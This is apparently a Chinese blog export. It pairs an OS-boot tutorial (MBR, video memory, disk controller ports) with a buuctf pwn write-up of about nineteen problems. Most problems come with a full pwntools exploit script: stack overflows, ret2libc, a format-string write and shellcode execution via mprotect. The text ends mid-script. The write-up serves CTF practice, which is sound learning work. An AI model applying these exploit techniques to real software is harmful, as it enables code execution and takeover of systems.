主引导记录BIOS最后的工作就是检验0盘0道1扇区的内容（就是第一个磁盘扇区）。检验时若BIOS检验处该磁盘末尾两个字节是0x55和0xaa,则认为其是活动区，便加载到物理地址0x7c00,然后跳转过去，执行MBR\n\n  \n    \n      tips\n\n    \n    \n      磁盘扇区\n存储设备中的最小物理存储单元，也是操作系统和文件系统读写数据的基本单位，可以理解为书架的每一个格子\n通过磁头（HDD）或控制器（SSD)定位到目标扇区，读取数据到内存\n为什么是0x55 0xaa\n这是MBR的引导签名，用于告诉BIOS该磁盘有效的引导代码。属于是早期签名的遗留\n\n    \n  \n\nMBR为我们第一个在编写操作系统中自行构造出来的程序，但是要遵循下面一些规定：\n\nMBR的大小为512字节\n第511和512字节必须要是0xaa,0x55（由于模拟的是x86平台，所以采用小端序）\n凑行\n\n那么接下来就可以编写mbr.S程序，主要思路如下：\n\n\n清屏。利用BIOS所建立的中断向量表，用0x06号功能（也就是int 0x10),我们实现系统调用的操作只需要我们将功能号送入ah（也就是向ax中传入0x600)寄存器，然后执行int 0x10\n在编写的section后面加上vstart&#x3D;0x7c00表示，告诉编译器将起始地址编译为0x7c00\n通过中断3号功能来获取光标位置\n利用中断向量来实现打印字符串\n填充到511字节\n填充0xaa, 0x55\n\n\n0x02 MBR支持显卡在之前的MBR中，我们用BIOS的中断实现打印字符擦到屏幕，然后用jmp自身这个指令来实现类似while的功能，但打印字符串之后就结束了，接下来完善MBR的功能\n0x02 0x00首先先解释几个重要的标志位\n\n\n\nCF进位标志\n用于反应运算是否产生进位或借位，如果运算结果的最高位产生一个进位或借位，则CF置1.运算结果的最高位包括字操作的第15位和字节操作的第7位\n\n\n\nPF奇偶标志\n用于反映运算结果低8位中“1”的个数\n\n\nAF辅助进位标志\n在字节操作时低半字节向高半字节进位或借位，字操作时低字节向高字节进位或借位，AF置1\n\n\nZF零标志\n用于判断结果是否为0，运算结果为0时置1\n\n\nSF符号标志\n反应运算结果的符号，运算结果为负，SF为1\n\n\nOF溢出标志\n反映有符号数加减运算是否溢出，溢出时置1\n\n\nTF陷阱标志\n当TF被置1时，CPU进入单步模式（每执行一步指令后都产生一个单步中断）\n\n\nIF中断标志\n决定CPU是否响应外部可屏蔽中断请求，IF为1时，允许响应外部的可屏蔽中断请求\n\n\nDF方向表示\n决定串操作指令执行时有关指针寄存器调整方向。DF为1时，串操作指令按递减的方式改变有关存储器指针值，每次操作后使SI、DI递减\n\n\n0x02 0x01 IO接口什么是IO接口\n可以理解为一系列端口与控制逻辑的结合，它所实现的功能就是让计算机与外设可以通信，就是在CPU和外设之间，又加了一层逻辑\n如何使得CPU访问到IO接口\n一种方法是统一编址，在统一编址之下，我们会将主存分开一部分来供IO接口来使用，比如说0x000~0x7ff为咱们正常使用的物理地址，剩下的0x800-0xfff就全部作为IO接口地址来进行访问，只要访问的地址落于后一段，CPU就认为在使用某一个IO接口\n还有一种方法是选择独立编址，访问主存的地址与IO接口的地址无关，COU区分你是访问主存还是IO接口的因素是指令操作码，也就是类似于ADD、SUB等这类的汇编语句，不需要从主存专门划分出一段区域供IO接口使用。下面是关于这一种访问方式的语法\n\n  \n    \n      tips\n\n    \n    \n      \nin指令用来从端口中读取数据，一般形式为\n\nin al,dx\n\nin ax,dx\n这里的al，ax是指从端口读取数据所存放的寄存器，而dx是指IO端口号\n\n\n\nout指令用来向端口输入数据，一般形式为\n\nout dx\\立即数,al\n\nout dx\\立即数,ax\n同in指令\n\n\n\n\n\n    \n  \n\n0x02 02 显示器、显卡、显存上一次我们是通过BIOS所建立的中断向量表实现向显示器输送一段数据。但是BIOS的中断向量表示在实模式之后的保护模式将不存在，所以接下来要试着利用IO进行输出字符到显示器上\n下面是显存分布\n\n\n\n起始\n结束\n大小\n用途\n\n\n\nC0000\nC7FFF\n32KB\n显示适配器BIOS\n\n\nB8000\nBFFFF\n32KB\n用于文本模式显示适配器\n\n\nB0000\nB7FFF\n32KB\n用于黑白显示适配器\n\n\nA0000\nAFFFF\n64KB\n用于彩色显示适配器\n\n\n由上表可知，当地址处于0xB8000-0xBFFFF时，在此的输出的数据会直接落在显存中，接下来显示器就可以直接拿到CPU所输出的数据（又是加了一层抽象）\n0x03 升级MBR接下来我们就需要利用IO功能来时实现打印功能了\n其实原理看着很繁琐，但是代码是很简单的，例如\nmov byte [gs:0x00], &#x27;M&#x27;mov byte [gs:0x01], 0x94mov byte [gs:0x02], &#x27;a&#x27;mov byte [gs:0x03], 0x94mov byte [gs:0x04], &#x27;p&#x27;mov byte [gs:0x05], 0x94mov byte [gs:0x06], &#x27;l&#x27;mov byte [gs:0x07], 0x94mov byte [gs:0x08], &#x27;e&#x27;mov byte [gs:0x09], 0x94\n\n0x03 MBR操作硬盘以及Loader继续升级MBR,这次如题所示，了解磁盘相关内容\n0x03 00 基础知识磁盘\n\n\n\n介绍\n图片\n\n\n\n一个磁盘由多个盘片叠加而成；盘片的表面涂有磁性物质，用来记录二进制数据，因此一个盘片可能有两个盘面\n\n\n\n每个盘片被划分为一个个磁道，每个磁道又被划分为一个个扇区。其中，最内侧磁道上的扇区面积最小，因此数据密度最大\n\n\n\n每个盘面对应一个磁头。所有的磁头都是在一个磁臂上的。所有盘面中相对位置相同的磁道组成柱面\n\n\n\n因此，可以用（柱面号、盘面号、扇区号）来定位任意一个磁盘块。这也可以称为物理磁盘地址\n\n\n\n而根据物理磁盘地址，可以实现读取一个“块”\n根据“柱面号”移动磁臂，让磁头指向指定柱面 -&gt; 激活指定盘面对应的磁头 -&gt; 磁盘旋转的过程中，指定的扇区会从磁头下面划过，完成了对指定扇区的读&#x2F;写\n硬盘控制端口\n硬盘同样是一种外设，需要指定的IO接口和CPU通信，这个IO接口就叫做硬盘控制器\n其IO模式与显卡不同，使用显卡时我们使用的是统一编址，但是硬盘控制器使用独立编址\n主盘、从盘、通道\n电脑中通常安装多个硬盘，因此需要分出主从关系，也就衍生出了硬盘中的Master和Slave，即主盘和从盘（你就是老娘的master吗）。很久以前系统一般安装在主盘上，但随着计算机的发展，这两种盘区别变得不是那么大了\n一般主板上会给出两个叫做通道的插槽，这是一种比DMA更加高级的存在，负责IO的数据直接传到内存，不需要CPU控制\n端口寄存器\n\n实际上端口可以简单的被分为两组，即Command Block registers和Control Block registers。其中前者用于向硬盘驱动器写入命令或者从硬盘控制器获得硬盘状态；后者用于控制硬盘工作状态\n接下来介绍一下各个端口的用途\n\nData寄存器：用来管理数据，是唯一的16位。一般来说，读磁盘时，不断读此寄存器相当于读出硬盘控制器中的缓冲数据；写磁盘时，将数据写入该磁盘相当于向硬盘控制器写入数据\n\nError寄存器:只有在读取硬盘失败的时候，端口为0x171&#x2F;0x1f1的寄存器中才记录失败的信息，尚未读取的扇区数放在Sector count寄存器中\n\nFeature寄存器：只有在写硬盘，并且需要额外指定参数时，将参数写入该寄存器\n\nLBA寄存器：这里需要详细说一下LBA的相关信息\n\n前面分析的时候，我们都是按照”柱面-磁头-扇区“来进行定位，这种方法称为CHS，但是这种方法略显复杂，我们更希望使用逻辑上的地址进行定位，而不需要考虑物理结构，因此诞生了LBA寄存器\n目前的LBA共有两种，LBA28和LBA48，即28bit&#x2F;48bit描述扇区的地址，而因为每个扇区都是512字节，则其支持的最大硬盘容量为128GB&#x2F;128PB。\nLBA low、mid、high分别对应地址0-7位、8-15位和16-32位。仅靠这些寄存器无法唯一标识LBA，因此还需要使用Device寄存器，其低4位白哦是LBA28的24-27位，从而与上面可以共同完成LBA28的表示；第4位标识通道中的主盘或从盘；第5、7位为固定的1，称为MBS位；第6位标识是否启用LBA模式\n\n\nStatus寄存器：其在读硬盘时，用来给出硬盘的状态信息，\n\n第0位是ERR位，如果为1，表示命令出错，可以查看Error位；\n\n第3位是data request位，如果为1，表示硬盘数据已经准备完毕，可以读取数据；\n\n第6位是DRDY，如果为1，表示硬盘检测正常；\n\n第7位是BSY位，如果为1，表示硬盘正忙，其余所有位都无效。写硬盘时，该端口充当command寄存器，存放需要硬盘执行的命令。主要包括三个命令\nidentify: 0xEC\t;硬盘识别read sector：0x20\t；读扇区write sector：0x30\t；写扇区\n\n\n\n硬盘操作方法\n硬盘中可用的指令有很多，主要介绍数据的传送方式，大致顺序如下\n\n选择通道,往通道的sector count寄存器写入我们即将操作的扇区数目\n向0x1F3、0x1F4、0x1F5分别写入LBA地址的低24位\n往device寄存器的低4字节写入LBA地址的高4位，设置第6位为1,表明使用LBA寻址模式，再设置第四位来选择操作的硬盘是主盘还是从盘\n往通道的command寄存器写入操作命令\n读取通道上的status寄存器，判断硬盘工作是否完成\n若上述命令选择了读硬盘，则进入下一个步骤，若为写或者其他，则完工\n将硬盘数据读出\n\n数据传输方式一般为两种;\n\n查询传送方式：也称为程序I&#x2F;O、PIO，指传输之前，先获取硬盘控制器的Status控制器，如果为数据可用，则获取数据即可\n中断传送方式：也称为中断驱动I&#x2F;O，当硬盘设备准备号数据后，通过发送中断通知来通知COU，然后CPU直接获取数据\n\n0x03 01 使用MBR来操作硬盘我们知道MBR的本职工作是加载Loader，然后Loader加载我们的操作系统。Loader也是存放在硬盘上的，所以就需要改进MBR来实现读取硬盘上的程序操作，依此加载Loader\nLoader的位置\n按照上文的介绍，MBR加载在第一个扇区，但是由于是LBA寻址，所以MBR存放在0扇区。因此理论来说1扇区之后的所有地点都可以存放Loader，但是为了保险起见，设置一个空扇区作为缓冲，将之放入2扇区。\n之后的操作就是:MBR将Loader从2扇区读出来，然后将之存入内存\n存入内存哪里呢？请看下面内存布局图，标记为可用的其实都可以使用\n\n\n\n开始地址\n结束地址\n大小\n用途\n\n\n\nFFFF0\nFFFFF\n16B\nBIOS入口，这么小的一个位置实际上仅仅是一个跳转指令\n\n\nF0000\nFFFEF\n64KB-16B\n系统BIOS\n\n\nC8000\nEFFFF\n160KB\n映射硬件适配器的ROM或内存映射式I&#x2F;O\n\n\nC0000\nC7FFF\n32KB\n显示适配器BIOS\n\n\nB8000\nBFFFF\n32KB\n文本显示适配器\n\n\nB0000\nB7FFF\n32KB\n黑白显示适配器\n\n\nA0000\nAFFFF\n64KB\n彩色显示适配器\n\n\n9FC00\n9FFFF\n1KB\nEBDA\n\n\n7E00\n9FBFF\n约608KB\n可用\n\n\n7C00\n7DFF\n512B\nMBR加载地址\n\n\n500\n7BFF\n约30KB\n可用\n\n\n400\n4ff\n256B\nBIOS数据区域\n\n\n000\n3FF\n1KB\n中断向量表\n\n\n功能实现\n跟着博客教程来就好了，这边不加叙述\n01 部分总结截止目前，我们已经完成了从POST到Loader的过程，在这个过程里，我们通过用mbr，通过实模式编址来实现地址的访问，并学习了IO接口的访问，了解如何通过IO接口建立起外设和CPU的联接。\n但是实模式编址的缺点也是显而易见的，那么接下来的文章里，会学习保护模式等内容，继续完善我们的开机过程\n","categories":["OS"],"tags":["OS"]},{"title":"buuctf","url":"/2025/04/05/buuctf/","content":"buuctf刷题记录（1-20题）by Maple\n有人说我的前面的题解没解析，看不懂？那我来补上了\n1 test_ncnc 节点 端口\n\n没有nc？去看这篇！\n\n然后cat flag\n\ncat:catch 抓住。就是显示文件中的内容\n\n2 rip打开ida看下源码\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  char s[15]; // [rsp+1h] [rbp-Fh] BYREF  puts(&quot;please input&quot;);  gets(s, argv);  puts(s);  puts(&quot;ok,bye!!!&quot;);  return 0;&#125;\n\n看到一个不限制输入长度的gets()函数，并且根据ida的分析，s位于栈底（rbp）上方0xF处,那么我们输入0xF字节之后再覆盖掉rbp，是不是就到了rbp下面的返回地址处？那么我们把后门函数的地址写在返回地址处，不就可以跳转到后门函数了嘛\n\n为什么rbp下面是返回地址？罚你看这篇\n\nexp:\nfrom pwn import *p = process(&#x27;./pwn1&#x27;)p.sendline(b&#x27;a&#x27;*0xF+b&#x27;b&#x27;*0x8+p64(0x40118a))p.interactive()\n\n3 warmup_csaw_2016和上一题是一样的，可以将v5和rbp覆盖，然后篡改返回地址\nexp:\nfrom pwn import *#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,28694)payload = b&#x27;a&#x27;*72+p64(0x40060d)p.sendline(payload)p.interactive()\n\n在本地打了半天以为我有问题，最后想起来system执行的是cat flag，不会有shell\n4 ciscn_2019_n_1看下ida逆出来的代码\n\n发现想要获取flag的内容，需要v2=11.28125,但是，我们一定要让if执行嘛，一定要合程序的意嘛，都打pwn了，怎么可以顺着程序的意来呢\n所以有两种思路，一种是覆盖返回地址，一种是覆盖v2\n\n覆盖返回地址，直接return system处\nexp:\n\n\nfrom pwn import *p = process(&#x27;./pwn&#x27;)retaddr=0x4006BEpayload=b&#x27;a&#x27;*56+p64(retaddr)p.sendline(payload)p.interactive()\n\n\n覆盖v2数值\n可以看到我们的输入是在v2赋值之后的事，所以可以通过溢出来把v2的值给覆盖了，0x2c = 0x30-0x4\n\n不知道为什么填充的是0x4138000?学一下浮点数的存储叭，或者，按下tab，对准那个黄色的地方双击（如果不是这样子的话按下空格）\n\n\n你就得到了11.28125的十六进制存储\n\n\n\n\nexp：\nfrom pwn import *p = process(&#x27;./pwn&#x27;)payload = b&#x27;a&#x27;*0x2c+p64(0x41348000)p.sendline(payload)p.interactive()\n\n5 pwn1_sctf_2016限制了32字节的读入，但是后面的操作会把I变为you，留4字节给esp，输入20个I就行\nfrom pwn import *p = process(&#x27;./pwn&#x27;)payload = b&#x27;I&#x27;*20+b&#x27;a&#x27;*4+p32(0x8048F0D)p.sendline(payload)p.interactive()\n\n这次学好了，先在本地创建了一个flag.txt的文件\n6 jarvisoj_level0ret2text不多说了(用了下自己的模板，有很多不需要)\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)p = process(&#x27;./pwn&#x27;)#p = remote(&#x27;&#x27;,)def dbg():    gdb.attach(p)    pause()payload = b&#x27;a&#x27;*0x80+b&#x27;b&#x27;*0x8+p64(0x40059A)p.sendline(payload)p.interactive()\n\n7 [第五空间2019 决赛]PWN5有一个很好用的pwntools语法：\nfmtstr_payload(number,&#123;addr:value&#125;)\nnumber表示偏移字节数，addr为你要写入的地址，value为你要更改为的数值\n\n这里分析题目可以发现，我们在buf段溢出，然后覆盖dword_804C044，再输入相同的覆盖值就行\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)p = process(&#x27;./pwn&#x27;)def dbg():    gdb.attach(p)    pause()p.recvuntil(&#x27;name:&#x27;)payload = fmtstr_payload(11,&#123;0x804C044:0x1&#125;)p.sendline(payload)p.recvuntil(&#x27;passwd:&#x27;)p.sendline(&quot;1&quot;)p.interactive()\n\n8 jarvisoj_level2一个32位的题目，和64位有些区别，但不多\n32位system（）利用栈传参，不用寄存器.\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)p = process(&#x27;./pwn&#x27;)def dbg():    gdb.attach(p)    pause()sys = 0x8048320\t# system的地址binsh = 0x804A024\t#binsh的地址payload = b&#x27;a&#x27;*0x88+b&#x27;b&#x27;*0x4+p32(sys)+p32(1)+p32(binsh)#垃圾数据+覆盖返回地址(32位是4字节）+system地址调用+随意参数填充+binsh填充p.sendline(payload)p.interactive()\n\n9 ciscn_2019_n_8可以发现如果var[13]是17就getshell\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)p = process(&#x27;./pwn&#x27;)def dbg():    gdb.attach(p)    pause()payload = p32(17)*14p.sendline(payload)p.interactive()\n\n10 bjdctf_2020_babystack自定义输入长度，栈溢出\nfrom LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)p = process(&#x27;./pwn&#x27;)def dbg():    gdb.attach(p)    pause()p.sendline(b&#x27;100&#x27;)payload = b&#x27;a&#x27;*0x10+b&#x27;b&#x27;*0x8+p64(0x4006EA)p.sendline(payload)p.interactive()\n\n11 ciscn_2019_c_1ret2libc，加密的地方可以溢出，可以在输入的地方输入一个’\\0’绕开加密过程\nfrom pwn import*from LibcSearcher import*p=remote(&#x27;node5.buuoj.cn&#x27;,26071)#p = process(&#x27;./pwn&#x27;)elf=ELF(&#x27;./pwn&#x27;)main = 0x400B28pop_rdi = 0x400c83ret = 0x4006b9puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]p.sendlineafter(&#x27;Input your choice!\\n&#x27;,&#x27;1&#x27;)offset = 0x50+8payload = b&#x27;\\0&#x27;+b&#x27;a&#x27;*(offset-1)payload+=p64(pop_rdi)payload+=p64(puts_got)payload+=p64(puts_plt)payload+=p64(main)p.sendlineafter(&#x27;Input your Plaintext to be encrypted\\n&#x27;,payload)p.recvline()p.recvline()puts_addr=u64(r.recvuntil(&#x27;\\n&#x27;)[:-1].ljust(8,b&#x27;\\0&#x27;))print(hex(puts_addr))libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)Offset = puts_addr - libc.dump(&#x27;puts&#x27;)binsh = Offset+libc.dump(&#x27;str_bin_sh&#x27;)system = Offset+libc.dump(&#x27;system&#x27;)p.sendlineafter(&#x27;Input your choice!\\n&#x27;,&#x27;1&#x27;)payload = b&#x27;\\0&#x27;+b&#x27;a&#x27;*(offset-1)payload+=p64(ret)payload+=p64(pop_rdi)payload+=p64(binsh)payload+=p64(system)p.sendlineafter(&#x27;Input your Plaintext to be encrypted\\n&#x27;,payload)p.interactive()\n\n12 jarvisoj_level2_x64rdi传递binsh\n又是本地打不通，远程可以打通，不理解\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)p = process(&#x27;./pwn&#x27;)#p = remote(&#x27;node5.buuoj.cn&#x27;,28182)def dbg():    gdb.attach(p)    pause()pop_rdi = 0x00000000004006b3binsh = 0x600A90system = elf.plt[&#x27;system&#x27;]ret = 0x00000000004004a1p.recv()payload = b&#x27;b&#x27;*0x80+b&#x27;b&#x27;*8+p64(pop_rdi)+p64(binsh)+p64(system)p.sendline(payload)p.interactive()\n\n13 get_started_3dsctf_2016\n通过mprotect()函数改内存为可读可写可执行\n\n加入read函数\n\n在read函数中构造shellcode\n\n\n至于为什么是0x80EB000而不是bss段的开头0x80EBF80。\n\n 因为指定的内存区间必须包含整个内存页（4K），起始地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍。\n\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,25636)def dbg():    gdb.attach(p)    pause()pop_ret = 0x0804951D# 这里是一个有三个寄存器的pop_retmprotect_addr = elf.sym[&#x27;mprotect&#x27;]mem_addr = 0x80EB000mem_size = 0x1000mem_proc = 0x7read_addr = elf.sym[&#x27;read&#x27;]# 调用mprotect函数payload = b&#x27;a&#x27;*0x38payload+=p32(mprotect_addr)payload+=p32(pop_ret)# 填充mprotect参数payload+=p32(mem_addr)payload+=p32(mem_size)payload+=p32(mem_proc)# 调用read函数payload+=p32(read_addr)payload+=p32(pop_ret)# 填充read参数payload+=p32(0)payload+=p32(mem_addr)payload+=p32(0x100)# read返回后跳转到shellcode所在地址payload+=p32(mem_addr)p.sendline(payload)payload2 = asm(shellcraft.sh())p.sendline(payload2)p.interactive()\n\nint mprotect(void *addr, size_t len, int prot);  (NX保护绕过)\n*void addr：目标内存区域的起始地址，必须按页对齐（对齐到系统页大小）\n页是操作系统管理内存的最小单位，大小通常为4KB(4096字节)或2MB(64位某些情况下的大页内存），页对齐是指内存地址必须是页大小的整数倍\n\n\nsize_t len\n要修改权限的内存区域长度，必须是页大小的整数倍\n\n\nint prot：权限标志位，通过位掩码组合\nPROT_READ(可读)\nPROT_WRITE(可写）\nPROT_EXEC(可执行)\n\n\n返回值：\n成功：返回0\n失败：返回-1，并设置errno\n\n\n\n14 [HarekazeCTF2019]baby_ropROP构造\nfrom pwn import *p = process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)system_addr = elf.sym[&#x27;system&#x27;]binsh = 0x601048pop_rdi = 0x400683ret = 0x400479`0payload = b&#x27;a&#x27;*0x10+b&#x27;b&#x27;*0x8+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system_addr)p.sendline(payload)p.interactive()\n\n15 others_shellcode我没看明白这题想干嘛，反正直接nc就getshell了，那就这样吧，似乎是直接进行了…\n16 [OGeek2019]babyrop感觉这题有些难度，稍微讲一下吧\nchecksec一下\n❯ checksec pwn[*] &#x27;/home/pwn/pwn/buuctf/16/pwn&#x27;    Arch:       i386-32-little    RELRO:      Full RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x8048000)\n\n可以看到没有canary保护\n看一下主函数怎么说：\nint __cdecl main()&#123;  int buf; // [esp+4h] [ebp-14h] BYREF  char v2; // [esp+Bh] [ebp-Dh]  int fd; // [esp+Ch] [ebp-Ch]  sub_80486BB();  fd = open(&quot;/dev/urandom&quot;, 0);  if ( fd &gt; 0 )    read(fd, &amp;buf, 4u);  v2 = sub_804871F(buf);  sub_80487D0(v2);  return 0;&#125;\n\n在fd大于0的时候会读取数据，来到sub_804871F里看看\nint __cdecl sub_804871F(int a1)&#123;  size_t v1; // eax  char s[32]; // [esp+Ch] [ebp-4Ch] BYREF  char buf[32]; // [esp+2Ch] [ebp-2Ch] BYREF  ssize_t v5; // [esp+4Ch] [ebp-Ch]  memset(s, 0, sizeof(s));  memset(buf, 0, sizeof(buf));  sprintf(s, &quot;%ld&quot;, a1);  v5 = read(0, buf, 0x20u);  buf[v5 - 1] = 0;  v1 = strlen(buf);  if ( strncmp(buf, s, v1) )    exit(0);  write(1, &quot;Correct\\n&quot;, 8u);  return (unsigned __int8)buf[7];&#125;\n\n可以发现在if (strncmp(buf, s, v1))函数这里，如果s和buf的长度不一样就会退出程序\n但是这个函数本质上和strlen一样，在判断的字符串前加上\\x00就直接跳过了，所以我们在输入的垃圾字符第一位加上\\x00就行\n可以看到函数会将buf这个char型数组的buf[7]传出来给v2，再传递给sub_80487D0(v2)\n去sub_80487D0(v2)里看看\nssize_t __cdecl sub_80487D0(char a1)&#123;  char buf[231]; // [esp+11h] [ebp-E7h] BYREF  if ( a1 == 127 )    return read(0, buf, 0xC8u);  else    return read(0, buf, a1);&#125;\n\n可以看到这个里面的read读取数据的大小取决于传入的a1(其实就是v2，也就是buf[7])\n所以我们将buf[7]取到它的最大值（’\\xff’)，这个时候就可以通过溢出来构造ret2libc\n*ssize_t write(int fd, const void buf, size_t count);\nfd:文件描述符，代表要写入的目标\n0：标准输入（通常不用于写入）\n1：标准输出（默认输出到终端）\n2：标准错误（默认输出到终端）\n\n\n*const void buf:指向待写入数据的缓冲区指针\nsize_t count:要写入的字节数（从buf中读取的字节数）\n如果count为0，不会写入数据，但仍会检查文件描述符的有效性\n\n\n返回值:\n成功：返回实际写入的字节数\n失败：返回-1，并设置error标识错误类型\n\n\n\nfrom pwn import *from LibcSearcher import *context(log_level=&#x27;debug&#x27;)libc=ELF(&#x27;./libc-2.23.so&#x27;)\t# 题目描述里有下载libc-2.23.so的网址p=process(&#x27;./pwn&#x27;)#p=remote(&#x27;node5.buuoj.cn&#x27;,27450)elf=ELF(&#x27;./pwn&#x27;)ret=0x08048502payload=&#x27;\\x00&#x27;+&#x27;\\xff&#x27;*7p.sendline(payload)write_plt=elf.plt[&quot;write&quot;]write_got=elf.got[&quot;write&quot;]main_addr=0x08048825p.recvuntil(&quot;Correct\\n&quot;)payload1=b&#x27;a&#x27;*0xe7+b&#x27;a&#x27;*4+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(8)# \t\t溢出+覆盖+根据plt调用+返回main地址+wirte第一个参数+wirte第二个参数+write第三个参数p.sendline(payload1)write_addr=u32(p.recv(4))libc_base=write_addr-libc.sym[&#x27;write&#x27;]log.info(&quot;libc_base:&quot;+hex(libc_base))bin_sh_addr=libc_base+next(libc.search(b&#x27;bin/sh&#x27;))system_addr=libc_base+libc.sym[&#x27;system&#x27;]p.sendline(payload)p.recvuntil(&quot;Correct\\n&quot;)payload2=b&#x27;a&#x27;*0xe7+b&#x27;a&#x27;*4+p32(system_addr)+p32(0)+p32(bin_sh_addr)p.sendline(payload2)p.interactive()\n\n\n\n17 ciscn_2019_n_5有两种做法，第一种应该是题目的原意，但是我的ubuntu版本比较高，出现了一些问题，就直接当作ret2libc来写了\n第一种：\n因为第一次输入name的地方很大并且可执行，所以写入shellcode，然后跳转到name的地址就好\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,25442)def dbg():    gdb.attach(p)    pause()shellcode = asm(shellcraft.sh())p.recvuntil(b&#x27;name\\n&#x27;)p.sendline(shellcode)p.recvuntil(&#x27;me?\\n&#x27;)payload = b&#x27;a&#x27;*0x20+b&#x27;a&#x27;*0x8+p64(0x601080)p.sendline(payload)p.interactive()\n\n第二种：\n直接当作ret2libc来写，第二次的时候可以先把/bin/sh写入name中，然后调用name里的，记得先ret对齐一下\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,25442)def dbg():    gdb.attach(p)    pause()puts_got = elf.got[&#x27;puts&#x27;]puts_plt=elf.plt[&#x27;puts&#x27;]main = elf.sym[&#x27;main&#x27;]pop_rdi = 0x400713ret = 0x00000000004004c9p.recvuntil(&#x27;name\\n&#x27;)p.sendline(b&#x27;a&#x27;)p.recvuntil(&#x27;me?\\n&#x27;)payload = b&#x27;a&#x27;*0x20+b&#x27;b&#x27;*0x8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)p.sendline(payload)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base = puts_addr-libc.dump(&#x27;puts&#x27;)log.info(&quot;libc_base:&quot;+hex(libc_base))system = libc_base+libc.dump(&#x27;system&#x27;)p.sendafter(b&#x27;name\\n&#x27;, b&#x27;/bin/sh\\x00&#x27;)payload =b&#x27;a&#x27;*(0x20 +8) +p64(ret) +p64(pop_rdi) +p64(0x601080) +p64(system)p.sendlineafter(b&#x27;me?\\n&#x27;,payload)p.interactive()\n\nLibcSearcher选择第6个\n18 not_the_same_3dsctf_2016ida里面可以看到，在main函数上面的get_secret函数将flag.txt里的内容读入到了bss段，那么可以用write函数将其打印出来\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,27329)def dbg():    gdb.attach(p)    pause()write_addr = elf.sym[&#x27;write&#x27;]flag = 0x80ECA2Dpayload = b&#x27;a&#x27;*45+p32(0x80489A0)+p32(write_addr)+p32(0)+p32(1)+p32(flag)+p32(42)# 填充+读取flag函数跳转+write函数调用+write返回后的地址+fd参数+flag地址+输出字节数p.sendline(payload)p.interactive()\n\n19 ciscn_2019_en_2ret2libc,没啥好说的，跟之前有一题很像\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = 